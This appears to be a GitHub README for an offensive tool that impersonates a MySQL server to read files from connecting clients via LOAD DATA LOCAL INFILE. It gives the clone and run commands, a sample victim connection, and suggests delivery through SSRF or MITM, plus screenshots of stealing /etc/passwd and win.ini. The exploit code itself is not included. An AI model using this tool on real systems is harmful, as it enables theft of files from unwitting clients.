# MySQL Local Infile Exploit

Impersonates a MySQL server and attempts to retrieve files on the client system via LOAD DATA LOCAL INFILE.

This attack requires a client with LOCAL INFILE capabilities to connect to your server (whether via SSRF, MITM, or
stupidity).  The LOCAL INFILE capability is often enabled by default in older clients (especially in web applications).  

I wrote this after encountering a client which could be exploited multiple times in a single session.  In such an
instance, this program can be used to retrieve an entire list of files.

## Features
- Handles all file types
- Allows input lists and multiple files per session
- Supports Linux and Windows clients/servers (probably works on Mac too)
- Detects when clients aren't vulnerable
- Recreates target's directory tree when saving files locally
- Handles fragmented packets
- Extensive debug output allows you to see states and packets

## Screenshots
##### Help menu
![Help Menu](https://drive.google.com/uc?export=view&id=1pleKrRjtamVuyrTvqdnbR3zZKFThHhIm)

##### Exploiting a Debian Linux client to retrieve /etc/passwd (default)
![Exploiting Linux 1](https://drive.google.com/uc?export=view&id=1G-KWEbR29Bb3jdcBFaQQ3ZjtBjG44W8f)

##### Exploiting a Debian Linux client to retrieve a list of files
![Exploiting Linux 2](https://drive.google.com/uc?export=view&id=1IVL1fnO03lXYng0cD28IlzG61ihDA2gX)

##### Exploiting a Windows client to retrieve win.ini
![Exploiting Windows](https://drive.google.com/uc?export=view&id=10DGGZuORFfnb0nwTz7lJDfjZydfD-j7m)

##### Enabling verbosity during a failed exploitation attempt
![Verbose Output](https://drive.google.com/uc?export=view&id=1aC4elWN5rAfjVObHiHbvqFwcSnmJQ3bQ)

##### Enabling debug output during a failed exploitation attempt
![Debug Output](https://drive.google.com/uc?export=view&id=1A9gMaUHiv-UBr1-cgwcpAna9nOMWX5ju)

## Installation
`git clone https://github.com/jbacco/mysql-local-infile-exploit.git`

## Usage
Server (attacker):
`python3 mysql-local-infile-exploit.py`

Client (victim):
`mysql --host <server ip> --port 3306 --enable-local-infile=1 -u admin -padmin`

## Links
- [Abusing MySQL LOCAL INFILE to read client files](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)
- [Security Issues with LOAD DATA LOCAL](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)
- [MySQL OOB injections](https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927)
- [MySQL connect file read](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)
